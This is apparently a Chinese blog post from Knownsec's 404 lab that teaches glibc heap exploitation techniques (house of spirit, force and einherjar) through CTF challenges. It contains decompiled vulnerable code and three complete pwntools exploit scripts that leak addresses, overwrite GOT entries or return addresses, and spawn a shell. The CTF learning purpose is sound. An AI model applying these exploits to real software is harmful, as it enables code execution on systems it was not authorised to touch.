作者：Hcamael@知道创宇404实验室

准备一份house of系列的学习博文，在how2heap上包括下面这些：

  * house of spirit
  * house_of_force
  * house_of_einherjar
  * house_of_orange
  * house_of_lore

#### house of spirit

house of spirit是fastbin的一种利用方法，利用demo可参考:
<https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c>

我通过具体的CTF PWN题目来学习该利用方法，题目见: <https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo>

这题是hack.lu 2014
ctf的一道400分的32位下的PWN题，这题原本是没有给libc的，但是我搜了下网上这题的writeup，不需要libc有两种方法，一种是假设服务器上用的是最新版的libc，然后从各个发行版的系统找libc，一个一个试，另一种是使用ret2dl-resolve，这个利用方法我准备单独写一篇博文来说，而本文主要是学习house of spirit，所以就用本地的libc，假设已知libc。

漏洞点很简单，首先要能看出一个结构体：

    
    
    struct rifle {
        char descript[0x19]
        char name[0x1b]
        char *pre_add
    }

然后在`sub_8048644`函数中，大致逻辑如下：

    
    
    add()
    {
      rifles *v1;
      unsigned int v2;
    
      v1 = rifle;
      rifle = (rifles *)malloc(0x38u);
      if ( rifle )
      {
        rifle->pre_add = (int)v1;
        printf("Rifle name: ");
        fgets(rifle->name, 56, stdin);
        str_deal(rifle->name);
        printf("Rifle description: ");
        fgets(rifle->descript, 56, stdin);
        str_deal(rifle->descript);
        ++rifle_num;
      }
      else
      {
        puts("Something terrible happened!");
      }

结构体中`name`的长度只有0x1b，但是却能输入56长度的字符串，所以可以把后面的`pre_add`覆盖，或者把下一个堆进行覆盖

##### 泄露内存

因为libc已知，程序没开PIE，所以只需要泄露libc地址，然后算出libc基地址

内存泄露利用的是`sub_8048729`函数，该函数的大致逻辑如下:

    
    
    show_rifles()
    {
      rifles *i;
      unsigned int v2;
    
      printf("Rifle to be ordered:\n%s\n", "===================================");
      for ( i = rifle; i; i = (rifles *)i->pre_add )
      {
        printf("Name: %s\n", i->name);
        printf("Description: %s\n", i);
        puts("===================================");
      }
    }

`rifle->pre_add`是可控的，把`rifle->pre_add =
0x804A258-25`设置为sscanf的got表地址减去25，这样Name输出的就是`sscanf_got`的值，并且`sscanf_got->pre_add`的值为0，能让该程序继续运行而不报错

得到`sscanf_got`的值后，可以通过libc的偏移算出libc的基地址

##### 使用house_of_spirit进行任意地址写

house of spirit简单的来说就是free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块

所以第一步是要构造假的堆块，在该程序中，只有一个`malloc(0x38)`，所以要构造一个`size=0x41`的堆块，在`.bss_804A2A0`地址的`order_num`，和`.bss_804A2A4`的`rifle_num`，一个是在free的时候自增1，一个是在rifle
add的时候自增1，所以只要add 0x41次rifle，就能把rifle_num设置为0x41

chunk的size位伪造好了，现在是bypass libc对free
fastbin的check，主要是会对下一个chunk的size进行check，所以不仅要伪造当前check的size，还要伪造下一个chunk的size

下一个chunk的地址是`0x804A2A4+0x40=0x804a2e4`，该地址是储存`notice`的地址，属于可控区域，代码如下：

    
    
    information = (char *)&unk_804A2C0;
    
    leave()
    {
      unsigned int v0;
    
      printf("Enter any notice you'd like to submit with your order: ");
      fgets(information, 128, stdin);
      str_deal(information);
    }

假堆块构造完成了，free了之后`0x804A2A0`将会加入到fastbin中，在下一次add
rifle的时候malloc会返回该地址，所以`0x804A2A4`往下的变量都可控，这个时候我们能修改`information`的值，然后在`leave`函数会向`information`指向的地址写入值

这样就达到了任意地址写的目的

##### 最终利用

能做到任意地址写，下面就很简单了，方法有很多，我使用的是重写`sscanf_got`地址的值为计算出的`system`地址

    
    
    int read_action()
    {
      int v1; 
      char s;
      unsigned int v3;
    
      do
      {
        printf("Action: ");
        fgets(&s, 32, stdin);
      }
      while ( !__isoc99_sscanf(&s, "%u", &v1) );
      return v1;
    }

当输入了`/bin/sh`之后，会赋值给变量`s`，然后传给`sscanf`，这时候`sscanf_got`的值已经被改成了system的值，所以实际执行的是`system("/bin/sh")`

最终达成getshell的目的，payload如下:

    
    
    #!/usr/bin/env python
    # -*- coding=utf-8 -*-    
    from pwn import *
    
    context.log_level = "debug"
    
    def add(name, descrip):
        p.readuntil("Action:")
        p.sendline("1")
        p.readuntil("name:")
        p.sendline(name)
        p.readuntil("description:")
        p.sendline(descrip)
    
    def show_rifles():
        p.readuntil("Action:")
        p.sendline("2")
        p.readuntil("Name: ")
        p.readuntil("Name: ")
        return u32(p.read(4))
    
    def free():
        p.readuntil("Action:")
        p.sendline("3")
    
    def leave(message):
        p.readuntil("Action:")
        p.sendline("4")
        p.readuntil("order: ")
        p.sendline(message)
    
    
    sscanf_got = 0x804A258
    fake_heap = 0x804A2A0
    system_offset = 0x3ada0
    
    p = process("oreo_35f118d90a7790bbd1eb6d4549993ef0", stdin=PTY)
    
    name_payload1 = "aaa" + "bbbb"*6 + p32(sscanf_got-25)
    add(name_payload1, "hhh")
    sscanf = show_rifles()
    libc_base = sscanf - 0x5c4c0
    for x in xrange(0x40-1):
        add("mm", "gg")
    
    name_payload2 = "aaa" + "bbbb"*6 + p32(fake_heap+8)
    add(name_payload2, "uuu")
    message_payload = "\x00\x00\x00\x00"*9 + p32(0x41)
    leave(message_payload)
    # raw_input()
    
    free()
    # raw_input()
    add("name", p32(sscanf_got))
    leave(p32(libc_base+system_offset))
    p.sendline("/bin/sh\0")
    p.interactive()

#### house of force

house of force是修改top chunk size的一种利用方法，利用demo可参考:
<https://github.com/shellphish/how2heap/blob/master/house_of_force.c>

题目见: <https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200>

该利用姿势是由于libc的堆管理在malloc的时候默认top chunk的size是正确合法的，所以不会去检查top
chunk的size值，这就导致了一种情况，当一个程序存在可以修改top chunk size的漏洞时，我们把top
chunk的size修改成0xffffffff(x86)

假设这个时候的top_chunk=0x601200,
然后malloc(0xffe00020)，然后对malloc申请的size进行检查，`0xffe00030 <
top_chunk_size`，所以可以成功malloc内存，然后计算top_chunk的新地址：`0xffe00030+0x601200=0x100401230`,
因为是x86环境，最高位溢出了，所以`top_chunk=0x401230`

然后下次我们再malloc的时候，返回的地址就是`0x401238`

下面，我们再通过2016年bctf的一道题目来加强对该利用方式的理解

##### 泄露堆地址

有一个read_buffer函数:

    
    
    int read_buffer(int input, int len, char a3)
    {
      char buf;
      int i;
    
      for ( i = 0; i < len; ++i )
      {
        if ( read(0, &buf, 1u) <= 0 )
          exit(-1);
        if ( buf == a3 )
          break;
        *(_BYTE *)(input + i) = buf;
      }
      *(_BYTE *)(i + input) = 0;         // off by one
      return i;
    }

在注释里也已经标出来了，该函数存在off_by_one漏洞，会溢出一个`\x00`

然后存在内存泄露的是需要输入username的函数：

    
    
    void welcom_user()
    {
      char s; // [esp+1Ch] [ebp-5Ch]
      char *v2; // [esp+5Ch] [ebp-1Ch]
      unsigned int v3; // [esp+6Ch] [ebp-Ch]
    
      memset(&s, 0, 0x50u);
      puts("Input your name:");
      read_buffer((int)&s, 0x40, '\n');
      v2 = (char *)malloc(0x40u);
      name = (int)v2;
      strcpy(v2, &s);
      welcom((int)v2);
    }

看上面的注释，计算出v2变量和s变量在栈中的距离为0x40

当我输入0x40的a时，会把变量s填充满，然后在v1的第一个字节添加字符串结尾`\x00`，接下来，malloc的返回值赋给v2，把`\x00`给覆盖掉了，所以在strcpy函数把s的值+v2的值copy到v2指向的堆中，然后在welcom函数中输出，这样获得到了堆的地址

##### 修改top_chunk size

之后，有一个输入org和host的函数：

    
    
    void sub_804884E()
    {
      char org; // [esp+1Ch] [ebp-9Ch]
      char *v1; // [esp+5Ch] [ebp-5Ch]
      int host; // [esp+60h] [ebp-58h]
      char *v3; // [esp+A4h] [ebp-14h]
      unsigned int v4; // [esp+ACh] [ebp-Ch]
    
      memset(&org, 0, 0x90u);
      puts("Org:");
      read_buffer((int)&org, 0x40, 10);
      puts("Host:");
      read_buffer((int)&host, 0x40, 10);
      v3 = (char *)malloc(0x40u);
      v1 = (char *)malloc(0x40u);
      org_static = (int)v1;
      host_static = (int)v3;
      strcpy(v3, (const char *)&host);
      strcpy(v1, &org);
      puts("OKay! Enjoy:)");
    }

该函数存在和上面user函数一样的问题，我们来看看栈布局：

![](https://images.seebug.org/content/images/2018/01/922168fc-593f-4339-930b-e6fb43ac24bd.png-w331s)

然后再来看看malloc两次后的堆布局：

![](https://images.seebug.org/content/images/2018/01/71231356-f1f1-48a6-ab88-e3276c543212.png-w331s)

v1储存的是org的值，如果org中没有`\x00`，v1中没有`\x00`，strcpy将会copy
org+v1+host的值到堆中去，而堆中v1的size只有0x48，所以会导致堆溢出，可以覆盖到top_chunk的size，我们将该size赋值为0xffffffff

##### 控制malloc的返回值

    
    
    int new()
    {
      int result; // eax
      signed int i; // [esp+18h] [ebp-10h]
      int v2; // [esp+1Ch] [ebp-Ch]
    
      for ( i = 0; i <= 9 && note_list[i]; ++i )
        ;
      if ( i == 10 )
        return puts("Lack of space. Upgrade your account with just $100 :)");
      puts("Input the length of the note content:");
      v2 = get_int();
      note_list[i] = (int)malloc(v2 + 4);
      if ( !note_list[i] )
        exit(-1);
      note_length[i] = v2;
      puts("Input the content:");
      read_buffer(note_list[i], v2, 10);
      printf("Create success, the id is %d\n", i);
      result = i;
      dword_804B0E0[i] = 0;
      return result;
    }

在new函数中，可以控制malloc的size大小，然后我们需要考虑控制malloc跳到哪里

    
    
    int edit()
    {
      int length;
      int id; // [esp+14h] [ebp-14h]
      int note; // [esp+18h] [ebp-10h]
    
      puts("Input the id:");
      id = get_int();
      if ( id < 0 || id > 9 )
        return puts("Invalid ID.");
      note = note_list[id];
      if ( !note )
        return puts("Note has been deleted.");
      length = note_length[id];
      dword_804B0E0[id] = 0;
      puts("Input the new content:");
      read_buffer(note, length, 10);
      return puts("Edit success.");
    }

有一个edit函数，可以编辑note_list指向地址的值，所以如果我们能控制note_list的值，就可以做到任意地址修改

所以我们的目的是让下一次malloc的返回值为`0x804B120`，这样需要在这一次malloc后，让`top_chunk=0x804B118`

所以根据泄露出的heap地址计算出当前top_chunk的地址，然后再计算出本次malloc的size: `0x10804B118-top_chunk`
或者 `-(top_chunk-0x804B118)`

##### 泄露libc地址

按照该程序的逻辑，应该在show函数中成输出note_list指向地址的值，但是该函数的功能还未实现:

    
    
    int show()
    {
      return puts("WTF? Something strange happened.");
    }

所以就需要想别的办法来泄露libc地址了

我使用的方法的修改free_got的值为printf的值，然后在delete函数中，`free(note_list[x])`，`note_list[x]`修改成atoi_got的地址，这样就能泄露出atoi_got的值

但是因为不知道libc，所以不知道printf的值，但是因为有延时绑定，所以我们能把free_got的值修改成printf_plt+6的值

获取到libc的地址后，可以计算出system的值，然后再把atoi_got的值修改成system地址，达到getshell的目的

完整payload:

    
    
    #!/usr/bin/env python2.7
    # -*- coding=utf-8 -*-    
    from pwn import *
    
    context.log_level = "debug"
    
    def new_note(len,content):
        p.readuntil("--->>")
        p.sendline("1")
        p.readuntil("content:")
        p.sendline(str(len))
        p.readuntil("content:")
        p.sendline(content)
    
    def edit_note(i, data):
        p.readuntil("--->>")
        p.sendline("3")
        p.readuntil("id:\n")
        p.sendline(str(i))
        p.readuntil("content:\n")
        p.sendline(data)
        p.readuntil("success.")
    
    def delete_note(i):
        p.readuntil("--->>")
        p.sendline("4")
        p.readuntil("id:\n")
        p.sendline(str(i))
    
    p = process("./bcloud")
    e = ELF("./bcloud")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    pause()
    
    # leak heap
    p.readuntil("name:\n")
    p.send("a"*0x40)
    p.read(0x44)
    heap = u32(p.read(4))
    print "heap addr: " + hex(heap)
    
    # modify top chunk size to 0xffffffff
    p.readuntil("Org:")
    p.send("a"*0x40)
    p.readuntil("Host:")
    p.sendline(p32(0xffffffff))
    p.readuntil("Enjoy:")
    
    # malloc return address:0x804B120
    note_list = 0x804B120
    new_note(0x10, "aaa")
    new_note(-(heap+0xf4-0x804B120+8), "2333")
    
    # note_list[0] = free_got
    # note_list[1] = atoi_got
    # note_list[2] = atoi_got
    payload = p32(e.got["free"])
    payload += p32(e.got["atoi"])
    payload += p32(e.got["atoi"])
    new_note(0x100, payload)
    
    # write printf address to free_got
    edit_note(0, p32(e.symbols["printf"]+6))
    
    # printf(atoi_got)
    delete_note(1)
    atoi_libc = u32(p.read(4))
    p.readuntil("success.")
    libc_base = atoi_libc - libc.symbols["atoi"]
    print "libc_base: " + hex(libc_base)
    
    # calculate system address
    system = libc.symbols["system"] + libc_base
    
    # write system address to atoi_got
    edit_note(2, p32(system))
    
    # system("/bin/sh")
    p.sendline("/bin/sh")
    p.interactive()

#### house of einherjar

house of einherjar跟house of force差不多，最终目的都是控制top chunk的值，利用demo可参考:
<https://github.com/shellphish/how2heap/blob/master/house_of_einherjar.c>

题目见: <https://github.com/blendin/writeups/tree/master/2016/tinypad>

和house of force的区别是，通过off by
one把最后一个chunk的pre_inuse标志位置零，让free函数以为上一个chunk已经被free，这就要求了最后一个chunk的size必须要是0x100的倍数，要不然会check下一个chunk失败，或者和top
chunk进行合并操作的时候失败。

然后再伪造一个chunk，计算最后一个chunk到我们伪造chunk的距离，设置为最后一个chunk的pre_size位，当free最后一个chunk时，会将伪造的chunk和当前chunk和top
chunk进行unlink操作，合并成一个top chunk，从而达到将top chunk设置到我们伪造chunk的地址。

接下来通过2016年Second ctf的一个题来加深对该利用方法的理解：

##### 内存泄露

    
    
    if ( *(_QWORD *)&tinypad[16 * (v11 - 1 + 16LL)] )
    {
        free(*(void **)&tinypad[16 * (v11 - 1 + 16LL) + 8]);
        *(_QWORD *)&tinypad[16 * (v11 - 1 + 16LL)] = 0LL;
        writeln((__int64)"\nDeleted.", 9LL);
    }

在free了一个tinypad的时候，只把size位置零了，但是却没有把储存content的地址(`tinypad[16 * (v11 - 1 +
16LL) + 8]`)置零

然后在每次循环的时候，都会输出四个tinypad的信息：

    
    
    for ( i = 0; i <= 3; ++i )
        {
          LOBYTE(c) = i + '1';
        writeln((__int64)"+------------------------------------------------------------------------------+\n", 81LL);
          write_n((__int64)" #   INDEX: ", 12LL);
          writeln((__int64)&c, 1LL);
          write_n((__int64)" # CONTENT: ", 12LL);
          if ( *(_QWORD *)&tinypad[16 * (i + 16LL) + 8] )
          {
            v3 = strlen(*(const char **)&tinypad[16 * (i + 16LL) + 8]);
            writeln(*(_QWORD *)&tinypad[16 * (i + 16LL) + 8], v3);
          }
          writeln((__int64)&newline, 1LL);
        }

所以我们能增加4个tinypad，都申请一个0x100左右的chunk，然后释放第1个和第3个，这样就能形成unsortbin双链表，其中一个fd指向arena区域，一个fd指向另一个chunk，这样就泄露出了libc地址和堆地址

##### house of einherjar利用

首先是伪造一个合法的chunk，我们发现在edit分支，能控制`tinypad`地址的值：

    
    
    if ( *(_QWORD *)&tinypad[16 * (v11 - 1 + 16LL)] )
            {
              c = '0';
              strcpy(tinypad, *(const char **)&tinypad[16 * (v11 - 1 + 16LL) + 8]);
              while ( toupper(c) != 'Y' )
              {
                write_n((__int64)"CONTENT: ", 9LL);
                v6 = strlen(tinypad);
                writeln((__int64)tinypad, v6);
                write_n((__int64)"(CONTENT)>>> ", 13LL);
                v7 = strlen(*(const char **)&tinypad[16 * (v11 - 1 + 16LL) + 8]);
                read_until((__int64)tinypad, v7, '\n');        # 控制tinypad的值
                writeln((__int64)"Is it OK?", 9LL);
                write_n((__int64)"(Y/n)>>> ", 9LL);
                read_until((__int64)&c, 1uLL, 0xAu);
              }
              strcpy(*(char **)&tinypad[16 * (v11 - 1 + 16LL) + 8], tinypad);
              writeln((__int64)"\nEdited.", 8LL);
            }

所以我们tinypad就是我们伪造的chunk，伪造的chunk如下：

`&tinypad`:

![](https://images.seebug.org/content/images/2018/01/3e01eb7f-e44d-47d5-87c0-39152b3b3fa8.png-w331s)

刚才泄露内存已经释放了两个tinypad，还剩第二个和第四个tinypad，这个时候我释放第四个tinypad，这样第三个第四个将会和top_chunk合并

只要经过精心计算，这个时候我们再add一个tinypad，将会获得第一个tinypad(已经被释放)的堆地址，然后利用off by one漏洞:

    
    
    unsigned __int64 read_until(__int64 buf, unsigned __int64 len, unsigned int end)
    {
      int v4; // [rsp+Ch] [rbp-34h]
      unsigned __int64 i; // [rsp+28h] [rbp-18h]
      signed __int64 v6; // [rsp+30h] [rbp-10h]
    
      v4 = end;
      for ( i = 0LL; i < len; ++i )
      {
        v6 = read_n(0, buf + i, 1uLL);
        if ( v6 < 0 )
          return -1LL;
        if ( !v6 || *(char *)(buf + i) == v4 )
          break;
      }
      *(_BYTE *)(buf + i) = 0;           // off by one
      if ( i == len && *(_BYTE *)(len - 1 + buf) != 10 )
        dummyinput(v4);
      return i;
    }

比如tinypad 1的大小是`0xf0`，我们申请一个`0xe8`大小的内存，就会得到tinypad 1的堆，然后可以覆盖到tinypad
2的`pre_size`，如果tinypad2的size位是0x101，则会被off by one漏洞设置为0x100

我们计算出tinypad2的地址，然后减去tinypad的地址，计算出offset，设置为tinypad2的pre_size和伪造chunk的size位

然后我们再free tinypad2，伪造的chunk和tinypad2将会和top chunk合并，这个时候top chunk的值为tinypad的地址

##### bypass Full RELRO

top chunk已经被设置到tinypad地址了，tinypad+256地址开始储存着tinypad1 2 3
4的信息，所以当我们再次malloc的时候，tinypad 1 2 3
4的size和address都已经是可控的了，可以达到任意地址读，然后edit功能可以做到任意地址写

已经能任意地址读写了，正常思路就是写got表，然后getshell，但是发现程序开启了Full RELRO保护，got表将不可写

然后考虑了FILE_IO的利用方法，但是发现该程序的IO使用的都是read和write，并没有使用stdio库，故该思路也不可行

然后发现，在libc中有一个全局变量`__environ`, 储存着该程序环境变量的地址，而环境变量是储存在栈上的，所以可以泄露栈地址，所以可以控制rip了

我使用的思路是，计算出one_gadget的地址，然后把`ret __libc_start_main`改写成`ret
one_gadget`，从而达到getshell的目的。

完整Payload:

    
    
    #!/usr/bin/env python2
    # -*- coding=utf-8 -*-    
    from pwn import *
    
    
    def add(p, size, content):
        p.readuntil("(CMD)>>>")
        p.sendline("a")
        p.readuntil("(SIZE)>>>")
        p.sendline(str(size))
        p.readuntil("(CONTENT)>>>")
        p.sendline(content)
    
    def delete(p, index):
        p.readuntil("(CMD)>>>")
        p.sendline("d")
        p.readuntil("(INDEX)>>>")
        p.sendline(str(index))
    
    def edit(p, index, content):
        p.readuntil("(CMD)>>>")
        p.sendline("e")
        p.readuntil("(INDEX)>>>")
        p.sendline(str(index)) 
        p.readuntil("(CONTENT)>>>")
        p.sendline(content)
        p.readuntil("(Y/n)>>>")
        p.sendline("y")
    
    def main():
        # context.log_level = "debug"
        p = process("./tinypad")
        # e = ELF("./tinypad")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
        # leak libc and heap address
        add(p, 224, "a"*10)
        add(p, 246, "b"*0xf0)
        add(p, 256, "c"*0xf0)
        add(p, 256, "d"*10)
        delete(p, 3)
        delete(p, 1)
        # get heap address
        p.readuntil("# CONTENT: ")
        heap = p.readline().rstrip()
        heap += "\x00"*(8-len(heap))
        heap_base = u64(heap) - 0x1f0
        print "heap_base address: " + hex(heap_base)
        # get libc address
        p.readuntil("INDEX: 3")
        p.readuntil("# CONTENT: ")
        libc_address = p.readline().strip()
        libc_address += "\x00"*(8-len(libc_address))
        libc_base = u64(libc_address) - 0x3c4b78
        print "libc_base address: " + hex(libc_base)
    
        # make top -> tinypad(0x602040)
        add(p, 232, "g"*224 + p64(heap_base+240-0x602040))
        delete(p, 4)
        payload = p64(0x100) + p64(heap_base+240-0x602040) + p64(0x602040)*4
        edit(p, 2, payload)
        delete(p, 2)
    
        # modify free_hook -> one_gadget
        gadget1 = 0xf1117
        gadget2 = 0xf0274
        gadget3 = 0xcd1c8
        gadget4 = 0xcd0f3
        gadget5 = 0x4526a
        gadget6 = 0xf66c0
        gadget_address = libc_base + gadget1
        add(p, 0xe0, "t"*0xd0)
    
        payload = p64(232) + p64(libc_base + libc.symbols["__environ"])
        payload += p64(232) + p64(0x602148)
        add(p, 0x100, payload)
        p.readuntil("# CONTENT: ")
        stack = p.read(6)
        stack += "\x00"*(8-len(stack))
        stack_env = u64(stack)
        print "env_stack address: " + hex(stack_env)
        # pause()
        edit(p, 2, p64(stack_env-240))
        edit(p, 1, p64(gadget_address))
        p.readuntil("(CMD)>>>")
        p.sendline("Q")
        p.interactive()
    
    
    if __name__ == '__main__':
        main()

#### 总结

本篇文章分析了

  * house of spirit
  * house_of_force
  * house_of_einherjar

三种利用方法，还剩两种

  * house_of_orange
  * house_of_lore

其中，`house_of_lore`没发现有具体的实例题目，所以暂时不做研究

而`house_of_orange`涉及的知识点过多，所以会单独写一篇

house of系列第一次出现是`Phrack`2009年的杂志上，一共出现了下面几种：

  * The House of Mind
  * The House of Prime
  * The House of Spirit
  * The House of Force
  * The House of Lore

最后三种在how2heap上都有，前面两种，下次再说

#### 参考

  1. <https://github.com/shellphish/how2heap>
  2. <https://github.com/ctfs/write-ups-2016>
  3. <https://code.woboq.org/userspace/glibc/malloc/malloc.c.html>
  4. <http://www.phrack.org/issues/66/10.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/521/>

